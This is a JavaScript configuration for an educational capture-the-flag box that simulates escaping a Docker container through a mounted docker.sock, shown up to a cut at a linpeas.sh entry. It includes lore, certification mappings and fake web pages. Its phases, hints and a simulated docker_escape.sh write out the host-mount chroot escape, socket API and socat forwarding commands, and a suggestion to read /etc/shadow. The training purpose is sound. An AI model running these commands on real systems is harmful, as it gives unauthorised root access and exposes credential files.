/* ============================================================
   CTF ARENA — Box A11: The Dockerized Data Vault
   Container Escape — Docker Socket Exploitation
   Config: Docker CLI simulation, container enumeration, host mount escape,
           filesystem, flags, hints, lore
   ============================================================ */

const A11Config = {

    // ===============================================================
    // BOX METADATA
    // ===============================================================

    title: 'The Dockerized Data Vault',
    subtitle: 'Container Escape — Archivist Guild',

    // Tutorial mode (AR-12)
    tutorialMode: true,
    tutorial: {
            "steps": [
                    {
                            "title": "Reconnaissance",
                            "tip": "Start by scanning the target with nmap to discover services and potential attack vectors.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "cmd": "contains:nmap"
                                    }
                            }
                    },
                    {
                            "title": "Explore the target",
                            "tip": "Investigate the services you found. Browse web apps, check service versions, read documentation.",
                            "trigger": {
                                    "event": "navigate",
                                    "alt": [
                                            {
                                                    "event": "command",
                                                    "match": {
                                                            "phase": "RECON"
                                                    }
                                            }
                                    ]
                            }
                    },
                    {
                            "title": "Find the vulnerability",
                            "tip": "Look for misconfigurations, weak inputs, or known CVEs in the services you discovered.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "phase": "EXPLOIT"
                                    }
                            }
                    },
                    {
                            "title": "Capture the user flag",
                            "tip": "Exploit the vulnerability to gain initial access and retrieve the user flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "user"
                                    }
                            }
                    },
                    {
                            "title": "Escalate to root",
                            "tip": "Use what you found to escalate privileges and capture the root flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "root"
                                    }
                            }
                    }
            ]
    },
    difficulty: 'Advanced',
    accent: '#2980b9',
    storageKey: 'hexworth_ctf_a11',
    registryId: 'a11-dockerized-vault',
    trackerKey: 'ctf_a11',

    // ===============================================================
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ===============================================================

    certObjectives: {
        certPath: 'CS0-003',
        mappings: [
            { flagId: 'user', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources', skill: 'Docker Socket Exploitation' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources', skill: 'Container Escape to Host' }
        ],
        // SY0-701 (Security+) supplemental mappings — virtualization & container security
        supplemental: [
            {
                cert: 'SY0-701',
                domain: '2.0 — Threats, Vulnerabilities, and Mitigations',
                objective: '2.3',
                description: 'Explain various types of vulnerabilities: container/virtualization misconfigurations (privileged containers, mounted Docker sockets)',
                skill: 'Container Misconfiguration Identification',
                mitre: 'T1611'
            },
            {
                cert: 'SY0-701',
                domain: '4.0 — Security Operations',
                objective: '4.1',
                description: 'Given a scenario, apply common security techniques to computing resources: container security controls and isolation boundaries',
                skill: 'Container Security Hardening',
                mitre: 'T1610'
            },
            {
                cert: 'SY0-701',
                domain: '2.0 — Threats, Vulnerabilities, and Mitigations',
                objective: '2.2',
                description: 'Explain common threat vectors and attack surfaces: exposed management interfaces (Docker socket as root-equivalent access)',
                skill: 'Attack Surface Enumeration',
                mitre: 'T1046'
            },
            {
                cert: 'SY0-701',
                domain: '4.0 — Security Operations',
                objective: '4.2',
                description: 'Given a scenario, apply the appropriate vulnerability scanning methods: identify container escape paths via capability abuse and bind mounts',
                skill: 'Container Vulnerability Assessment',
                mitre: 'T1082'
            },
            {
                cert: 'SY0-701',
                domain: '3.0 — Security Architecture',
                objective: '3.1',
                description: 'Compare and contrast security implications of different architecture models: microservices / containerized architecture trust boundaries',
                skill: 'Container Architecture Analysis',
                mitre: 'T1068'
            }
        ]
    },

    // ===============================================================
    // PHASES — Docker Container Escape kill chain
    // ===============================================================

    phases: [
        {
            id: 'phase1',
            name: 'Recon',
            description: 'Identify the target and enumerate exposed services.',
            objectives: [
                'Run nmap against 10.10.14.40 — identify open ports (80, 2222)',
                'Browse the Archivist Guild web portal at http://10.10.14.40/vault/',
                'Review /vault/status/ for container infrastructure details',
                'Review /vault/api/ for Docker socket exposure and SSH credentials'
            ],
            mitre: [
                { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' },
                { id: 'T1595', name: 'Active Scanning', tactic: 'Reconnaissance' }
            ],
            hint: 'Start with a full nmap scan, then explore the web portal — the status and API pages are openly accessible and deliberately leak operational details.',
            completeWhen: 'Player reads /vault/api/ or /vault/status/ in browser'
        },
        {
            id: 'phase2',
            name: 'Container Enumeration',
            description: 'Gain initial access to the container and identify the Docker misconfiguration.',
            objectives: [
                'SSH into vault-indexer-01 via port 2222 (credentials: archivist / see API docs)',
                'Run id — confirm membership in the docker group',
                'Run ls -la /var/run/ — discover the exposed docker.sock',
                'Run cat /proc/1/cgroup — confirm you are inside a Docker container',
                'Run capsh --print — enumerate elevated container capabilities',
                'Read the user flag at /var/log/vault/user.txt'
            ],
            mitre: [
                { id: 'T1082', name: 'System Information Discovery', tactic: 'Discovery' },
                { id: 'T1087', name: 'Account Discovery', tactic: 'Discovery' },
                { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' },
                { id: 'T1610', name: 'Deploy Container', tactic: 'Defense Evasion' }
            ],
            hint: 'Once inside the container, check group membership (id) and look at /var/run/ — the docker.sock file is your primary vector.',
            completeWhen: 'Player submits user flag ({{FLAG:user}})'
        },
        {
            id: 'phase3',
            name: 'Container Exploitation',
            description: 'Abuse the exposed Docker socket to prepare for escape.',
            objectives: [
                'Run docker ps — enumerate all running containers via the daemon socket',
                'Run docker inspect vault-indexer-01 — confirm /var/run/docker.sock bind mount',
                'Run docker info — retrieve host OS details (vault-host, Ubuntu 22.04)',
                'Identify alpine image available locally for the escape container'
            ],
            mitre: [
                { id: 'T1613', name: 'Container and Resource Discovery', tactic: 'Discovery' },
                { id: 'T1552', name: 'Unsecured Credentials', tactic: 'Credential Access' }
            ],
            hint: 'docker inspect vault-indexer-01 shows the Mounts array — this is the blueprint for your escape. Look for which images are already pulled to avoid network noise.',
            completeWhen: 'Player runs docker ps or docker inspect successfully'
        },
        {
            id: 'phase4',
            name: 'Container Escape',
            description: 'Spawn a privileged container with the host filesystem mounted to break out of container isolation.',
            objectives: [
                'Run: docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash',
                'Confirm host shell: hostname returns vault-host, id returns uid=0(root)',
                'Enumerate host filesystem: ls /opt/ reveals master_manifest.txt'
            ],
            mitre: [
                { id: 'T1611', name: 'Escape to Host', tactic: 'Privilege Escalation' },
                { id: 'T1068', name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation' }
            ],
            hint: 'The docker run command mounts / (host root) into the new container at /mnt/host, then chroot makes that your working root — instantly giving you a root shell on the physical host.',
            completeWhen: 'Player activates _hostShellActive state via docker run escape command'
        },
        {
            id: 'phase5',
            name: 'Host Compromise',
            description: 'Operate as root on the Docker host and retrieve the Master Manifest.',
            objectives: [
                'Confirm root on host: cat /etc/hostname (vault-host), cat /etc/passwd',
                'Retrieve the root flag: cat /opt/master_manifest.txt',
                'Optional deep dive: cat /etc/shadow, review /etc/docker/daemon.json',
                'Submit the root flag to complete the box'
            ],
            mitre: [
                { id: 'T1005', name: 'Data from Local System', tactic: 'Collection' },
                { id: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' }
            ],
            hint: 'You are root on the host. The Master Manifest is in /opt/. The shadow file is a bonus. Document your escape path for the debrief.',
            completeWhen: 'Player submits root flag ({{FLAG:root}})'
        }
    ],

    // ===============================================================
    // BOOT SEQUENCE
    // ===============================================================

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ===============================================================
    // DESKTOP ICONS
    // ===============================================================

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ===============================================================
    // TERMINAL CONFIG
    // ===============================================================

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.14.40 (Archivist Guild — vault-indexer-01)\n'
    },

    // ===============================================================
    // FLAGS
    // ===============================================================

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ===============================================================
    // SCORING
    // ===============================================================

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 }   // 15 minutes
    },

    // ===============================================================
    // HINTS
    // ===============================================================

    hints: [
        {
            id: 'hint1',
            cost: 10,
            text: "Check if the Docker socket is mounted inside the container. SSH into the target and run: ls -la /var/run/docker.sock",
            penalty: -10
        },
        {
            id: 'hint2',
            cost: 25,
            text: "The Docker socket gives you full control of the Docker daemon. Try: docker ps",
            penalty: -25
        },
        {
            id: 'hint3',
            cost: 50,
            text: "Mount the host filesystem into a new container: docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash",
            penalty: -50
        },
        {
            id: 'hint4',
            cost: 75,
            text: "The Master Manifest is at /opt/master_manifest.txt on the host filesystem",
            penalty: -75
        }
    ],

    // ===============================================================
    // LORE
    // ===============================================================

    lore: {
        intro: 'The Archivist Guild has protected the knowledge of nations for three centuries — cataloguing secrets so sensitive that even their owners forgot they existed. Their vault system was the last word in archival security: containerized, isolated, air-gapped from the outside world. Or so they believed.',

        scenario: 'Intel suggests the Guild\'s archive network was compromised in a supply chain attack six months ago. An unknown actor inserted a backdoor at the infrastructure level — not in the application code, but in the container orchestration layer itself. The Guild\'s self-healing indexer service quietly received a configuration change: one additional line in the Compose file, mounting /var/run/docker.sock into the container for "automated management." The Guild\'s infrastructure team signed off on it without reading the security implications. Your mission is to trace that attack path, reproduce it, and exfiltrate the Master Manifest — the index to every archive the Guild has ever held. If it\'s out there, the Guild needs to know it\'s compromised.',

        ecer: {
            // ECER = Educational Cybersecurity Event Record — PhD research instrumentation
            // Maps box completion to learning outcomes and research metrics
            researchDomain: 'Container Security & Virtualization Exploitation',
            bloomsLevel: 5,                   // Evaluate — student must reason about trust model, not just execute
            bloomsVerb: 'Evaluate container trust boundaries and exploit misconfigurations to demonstrate privilege escalation',
            conceptualFramework: 'Defense in Depth / Least Privilege / Attack Surface Reduction',
            prereqConcepts: [
                'Linux filesystem and process model',
                'SSH protocol and key-based authentication',
                'Docker basics: images, containers, volumes, networks',
                'Unix socket communication',
                'Linux capabilities model'
            ],
            targetCompetencies: [
                'Identify container escape vectors from inside a running container',
                'Explain why a mounted Docker socket is equivalent to host root access',
                'Demonstrate the docker run -v / bind-mount escape technique',
                'Articulate the principle of least privilege in a containerized microservices context',
                'Propose mitigations: socket removal, rootless Docker, seccomp/AppArmor profiles, read-only socket mounts'
            ],
            difficultyMetrics: {
                cognitiveLoad: 'HIGH',            // Multi-layer environment (Kali → container → host)
                toolFamiliarity: 'INTERMEDIATE',  // Docker CLI expected but socket concept is novel
                prerequisiteDepth: 'MEDIUM',      // Needs Linux + Docker basics, not reversing/crypto
                expectedTimeMinutes: { min: 20, max: 45 }
            },
            researchInstrumentation: {
                preAssessmentPrompt: 'Before starting: What is /var/run/docker.sock? Who owns it? What happens if a process inside a container can write to it?',
                postAssessmentPrompt: 'After completing: Describe three mitigations that would prevent this attack. Which would you deploy first in a production environment and why?',
                observableIndicators: [
                    'Student recognizes docker group membership in id output (container enumeration phase)',
                    'Student navigates from /var/run/ discovery → docker ps → docker inspect without hints',
                    'Student correctly constructs the docker run escape command without hint3',
                    'Student articulates trust boundary violation in post-box debrief'
                ]
            },
            certAlignment: {
                primary: 'SY0-701',
                secondary: ['CS0-003', 'CAS-004'],
                examObjectives: [
                    'SY0-701 2.3 — Container/virtualization vulnerabilities',
                    'SY0-701 3.1 — Microservices/containerized architecture security',
                    'CS0-003 4.1 — Security techniques for computing resources'
                ]
            }
        },

        outro: 'The Archivist Guild\'s impenetrable vault was a lie. A single mounted socket — /var/run/docker.sock — gave you the keys to the kingdom. From inside a container meant to isolate, you reached out to the Docker daemon, spawned a privileged container with the host filesystem mounted at your feet, and extracted the Master Manifest. The lesson: container isolation is only as strong as its configuration. A mounted Docker socket is root access with extra steps.'
    },

    // ===============================================================
    // INTERNAL STATE — tracks whether player has "escaped" to host
    // ===============================================================

    _hostShellActive: false,
    _sshSessionActive: false,

    // ===============================================================
    // WEB APP — Archivist Guild Data Vault
    // ===============================================================

    webApp: {
        startUrl: 'http://10.10.14.40/vault/',

        pages: {

            // -- Page 1: Vault Login / Portal -------------------------
            '/vault/': {
                title: 'Archivist Guild — Data Vault',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #1a3a5c;">
                        <div style="font-size:2.2rem; margin-bottom:8px;">&#x1F5C3;</div>
                        <h1 style="color:#2980b9; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">Archivist Guild</h1>
                        <div style="color:#7f8c9a; font-size:0.78rem;">Data Vault Portal &mdash; Containerized Archive System v2.4.1</div>
                    </div>

                    <div style="max-width:420px; margin:0 auto 28px;">
                        <div style="background:#f0f4f8; border:1px solid #c8d6e5; border-radius:6px; padding:24px;">
                            <div style="color:#2c3e50; font-size:0.82rem; font-weight:700; margin-bottom:16px; letter-spacing:0.05em;">VAULT ACCESS</div>
                            <div style="margin-bottom:12px;">
                                <label style="display:block; color:#808080; font-size:0.75rem; margin-bottom:4px;">Archivist ID</label>
                                <input type="text" data-field="username"
                                       placeholder="Enter archivist ID"
                                       style="width:100%; padding:8px 12px; border:1px solid #b0b8c8; border-radius:4px; font-family:monospace; font-size:0.82rem; color:#2c3e50; box-sizing:border-box;">
                            </div>
                            <div style="margin-bottom:16px;">
                                <label style="display:block; color:#808080; font-size:0.75rem; margin-bottom:4px;">Access Key</label>
                                <input type="password" data-field="password"
                                       placeholder="Enter access key"
                                       style="width:100%; padding:8px 12px; border:1px solid #b0b8c8; border-radius:4px; font-family:monospace; font-size:0.82rem; color:#2c3e50; box-sizing:border-box;">
                            </div>
                            <button data-action="login"
                                    style="width:100%; padding:10px; background:#2980b9; color:#fff; border:none; border-radius:4px; font-weight:700; font-size:0.82rem; cursor:pointer; letter-spacing:0.05em;">Authenticate</button>
                        </div>
                    </div>

                    <div data-results style="max-width:500px; margin:0 auto;">
                        <div style="padding:12px 14px; background:#f8f9fb; border:1px solid #dde; border-radius:4px; font-size:0.75rem; color:#888; text-align:center;">
                            Enter credentials to access the vault. Contact your Guild administrator for provisioning.
                        </div>
                    </div>

                    <div style="max-width:500px; margin:16px auto 0; text-align:center;">
                        <a href="/vault/status/" style="color:#2980b9; font-size:0.75rem; text-decoration:none; margin:0 10px;">System Status</a>
                        <span style="color:#ccc;">|</span>
                        <a href="/vault/api/" style="color:#2980b9; font-size:0.75rem; text-decoration:none; margin:0 10px;">API Documentation</a>
                    </div>
                `,
                formHandler: function(data, engine) {
                    return A11Config._handleLogin(data, engine);
                }
            },

            // -- Page 2: System Status --------------------------------
            '/vault/status/': {
                title: 'Archivist Guild — System Status',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #1a3a5c;">
                        <h1 style="color:#2980b9; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">Archivist Guild</h1>
                        <div style="color:#7f8c9a; font-size:0.78rem;">System Status &mdash; Container Infrastructure</div>
                    </div>

                    <div style="max-width:680px; margin:0 auto;">
                        <div style="color:#2c3e50; font-size:0.78rem; font-weight:700; letter-spacing:0.1em; margin-bottom:16px; padding-bottom:6px; border-bottom:1px solid #eef;">CONTAINER INFRASTRUCTURE</div>

                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem; margin-bottom:28px;">
                            <thead>
                                <tr style="background:#e8f0fe;">
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Component</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Container</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Status</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Vault Indexer</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">vault-indexer-01</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">&#9679; Running</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Vault Web Portal</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">vault-web-01</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">&#9679; Running</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Archive Database</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">vault-db-01</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#27ae60; font-weight:700;">&#9679; Running</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Log Aggregator</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">vault-logs-01</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#e67e22; font-weight:700;">&#9679; Degraded</td>
                                </tr>
                            </tbody>
                        </table>

                        <div style="color:#2c3e50; font-size:0.78rem; font-weight:700; letter-spacing:0.1em; margin-bottom:16px; padding-bottom:6px; border-bottom:1px solid #eef;">DOCKER ENVIRONMENT</div>

                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem; margin-bottom:28px;">
                            <thead>
                                <tr style="background:#e8f0fe;">
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Property</th>
                                    <th style="padding:7px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Value</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Docker Engine</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">24.0.7</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Compose Version</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">2.21.0</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Runtime</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">runc 1.1.9</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Socket Mount</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem; color:#c0392b;">/var/run/docker.sock &rarr; vault-indexer-01</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee;">Network Mode</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">bridge (vault_network)</td>
                                </tr>
                            </tbody>
                        </table>

                        <div style="padding:12px 14px; background:#fff8e1; border:1px solid #ffe082; border-radius:4px; font-size:0.75rem; color:#7a6200; margin-bottom:16px;">
                            <strong>Maintenance Note:</strong> Docker socket is mounted into vault-indexer-01 for automated container management tasks. This is required for the self-healing indexer service. Do NOT remove without coordinating with the infrastructure team.
                        </div>

                        <div style="padding:12px 14px; background:#f8f9fb; border:1px solid #dde; border-radius:4px; font-size:0.75rem; color:#888;">
                            Last updated: 2024-12-02 14:22:31 UTC &mdash; All core services operational.
                        </div>
                    </div>
                `
            },

            // -- Page 3: API Documentation ----------------------------
            '/vault/api/': {
                title: 'Archivist Guild — API Documentation',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #1a3a5c;">
                        <h1 style="color:#2980b9; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">Archivist Guild</h1>
                        <div style="color:#7f8c9a; font-size:0.78rem;">API Documentation &mdash; Container Management Endpoints</div>
                    </div>

                    <div style="max-width:680px; margin:0 auto; font-size:0.82rem; color:#444; line-height:1.7;">

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px; margin-top:0;">Overview</h2>
                        <p>The Archivist Guild Data Vault uses a microservices architecture running on Docker. Each vault component is isolated in its own container. The <code style="background:#e8f0fe; padding:1px 5px; border-radius:3px; font-size:0.78rem;">vault-indexer-01</code> container has direct access to the Docker daemon via a mounted socket for automated container orchestration.</p>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">Container Management</h2>
                        <p>The indexer communicates with the Docker daemon through <code style="background:#e8f0fe; padding:1px 5px; border-radius:3px; font-size:0.78rem;">/var/run/docker.sock</code>. Available operations:</p>

                        <table style="width:100%; border-collapse:collapse; font-size:0.78rem; margin-bottom:16px;">
                            <thead>
                                <tr style="background:#e8f0fe;">
                                    <th style="padding:6px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Endpoint</th>
                                    <th style="padding:6px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Method</th>
                                    <th style="padding:6px 12px; text-align:left; color:#2c3e50; border-bottom:2px solid #b0c4de;">Description</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">/v1.43/containers/json</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">GET</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">List running containers</td>
                                </tr>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">/v1.43/images/json</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">GET</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">List available images</td>
                                </tr>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">/v1.43/containers/create</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">POST</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">Create a new container</td>
                                </tr>
                                <tr>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee; font-family:monospace;">/v1.43/info</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">GET</td>
                                    <td style="padding:5px 12px; border-bottom:1px solid #eee;">Docker daemon system info</td>
                                </tr>
                            </tbody>
                        </table>

                        <div style="padding:10px 14px; background:#fff8e1; border:1px solid #ffe082; border-radius:4px; font-size:0.75rem; color:#7a6200; margin-bottom:16px;">
                            <strong>Security Notice:</strong> Docker socket access is restricted to the vault-indexer-01 container. External API access is disabled. The Docker daemon listens on the Unix socket only &mdash; TCP port 2376 is filtered.
                        </div>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">Architecture</h2>
                        <pre style="background:#1a1a2e; color:#a8d8a8; padding:14px; border-radius:4px; font-size:0.72rem; overflow-x:auto; line-height:1.6; margin:0 0 16px;">
  +-------------------+     +-------------------+
  |  vault-web-01     |     |  vault-db-01      |
  |  (nginx + app)    |     |  (PostgreSQL)     |
  |  Port 80          |     |  Port 5432        |
  +--------+----------+     +--------+----------+
           |                         |
     vault_network (bridge)          |
           |                         |
  +--------+----------+     +--------+----------+
  |  vault-indexer-01  |     |  vault-logs-01    |
  |  (Python indexer)  |     |  (Fluentd)        |
  |  docker.sock mount |     |                   |
  +-------------------+     +-------------------+
           |
   /var/run/docker.sock
           |
  +--------+----------+
  |  Docker Daemon     |
  |  (Host)            |
  +-------------------+</pre>

                        <h2 style="color:#2c3e50; font-size:1rem; border-bottom:2px solid #eef; padding-bottom:6px;">SSH Access</h2>
                        <p>Containers can be accessed via SSH for maintenance. Default credentials for the indexer container:</p>
                        <ul style="color:#808080; margin:0 0 16px; padding-left:20px;">
                            <li>Host: <code style="background:#e8f0fe; padding:1px 5px; border-radius:3px; font-size:0.78rem;">10.10.14.40</code></li>
                            <li>Port: <code style="background:#e8f0fe; padding:1px 5px; border-radius:3px; font-size:0.78rem;">2222</code> (mapped to container SSH)</li>
                            <li>User: <code style="background:#e8f0fe; padding:1px 5px; border-radius:3px; font-size:0.78rem;">archivist</code></li>
                            <li>Auth: Key-based (see vault admin for provisioning)</li>
                        </ul>

                        <div style="padding:10px 14px; background:#fce4e4; border:1px solid #e8a0a0; border-radius:4px; font-size:0.75rem; color:#8b0000;">
                            <strong>WARNING:</strong> Do not expose the Docker socket to untrusted containers. Socket access is equivalent to root access on the host. Current exception: vault-indexer-01 requires socket access for self-healing orchestration tasks.
                        </div>
                    </div>
                `
            }
        }
    },

    // ===============================================================
    // LOGIN HANDLER
    // ===============================================================

    _handleLogin(data, engine) {
        const user = (data.username || '').trim().toLowerCase();
        const pass = (data.password || '').trim();

        if (!user || !pass) {
            return `<div style="padding:12px 14px; background:rgba(192,57,43,0.06); border:1px solid rgba(192,57,43,0.25); border-radius:4px; font-size:0.8rem; color:#c0392b;">
                <strong>Authentication Failed:</strong> Archivist ID and Access Key are required.
            </div>`;
        }

        // Any credentials get a realistic rejection
        if (user === 'admin' || user === 'archivist' || user === 'root') {
            return `<div style="padding:12px 14px; background:rgba(192,57,43,0.06); border:1px solid rgba(192,57,43,0.25); border-radius:4px; font-size:0.8rem; color:#c0392b;">
                <strong>Authentication Failed:</strong> Account <code>${A11Config._escHtml(user)}</code> is locked after 3 failed attempts. Contact Guild security for reset. <br><span style="font-size:0.72rem; color:#888;">(Incident logged: AUTH-FAIL-${Date.now().toString(36).toUpperCase()})</span>
            </div>`;
        }

        return `<div style="padding:12px 14px; background:rgba(192,57,43,0.06); border:1px solid rgba(192,57,43,0.25); border-radius:4px; font-size:0.8rem; color:#c0392b;">
            <strong>Authentication Failed:</strong> Unknown archivist ID. Access is provisioned by Guild administrators only.
        </div>`;
    },

    // ===============================================================
    // FILESYSTEM (attacker Kali machine)
    // ===============================================================

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.40 (Archivist Guild — Data Vault)\nObjective: Docker Container Escape — retrieve the Master Manifest\n\nIntel:\n  - The Archivist Guild runs a containerized data vault system\n  - Multiple Docker containers orchestrate vault operations\n  - One container (vault-indexer-01) has the Docker socket mounted\n  - The socket mount is the critical misconfiguration\n\nRecon steps:\n  1. nmap 10.10.14.40 — identify exposed services\n  2. Browse the vault web portal at http://10.10.14.40/vault/\n  3. Check /vault/status/ — look for container infrastructure details\n  4. Check /vault/api/ — understand the Docker socket exposure\n  5. SSH into the container via port 2222\n  6. Enumerate the container: find docker.sock, check capabilities\n  7. Use docker CLI to escape: mount host filesystem\n  8. Retrieve /opt/master_manifest.txt from the host\n\nFlags:\n  user.txt — confirm docker.sock access (container enumeration)\n  root.txt — Master Manifest on the Docker host\n\nThe key insight: a mounted Docker socket inside a container\nis equivalent to giving that container root access to the host.\n\nGood luck, operator.'
                                },
                                'payloads': {
                                    type: 'dir',
                                    children: {
                                        'docker_escape.sh': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# Docker Container Escape via Mounted Socket\n# Usage: Run from inside a container with docker.sock access\n\necho "[*] Docker Socket Escape Script"\necho "[*] Checking for docker.sock..."\n\nif [ -S /var/run/docker.sock ]; then\n    echo "[+] Docker socket found: /var/run/docker.sock"\n    echo "[+] Attempting host filesystem mount..."\n    echo ""\n    echo "# Method 1: Docker CLI (if available)"\n    echo "docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash"\n    echo ""\n    echo "# Method 2: curl to Docker API via socket"\n    echo "curl -s --unix-socket /var/run/docker.sock http://localhost/v1.43/containers/json | python3 -m json.tool"\n    echo ""\n    echo "# Method 3: socat proxy (forward socket to TCP)"\n    echo "socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock &"\n    echo ""\n    echo "# After escaping, look for:"\n    echo "# /opt/master_manifest.txt"\n    echo "# /root/root.txt"\n    echo "# /etc/shadow"\nelse\n    echo "[-] Docker socket not found. Try alternate escape methods."\n    echo "[-] Check: capsh --print (for capabilities)"\n    echo "[-] Check: mount (for mounted host paths)"\nfi'
                                        },
                                        'linpeas.sh': {
                                            type: 'file',
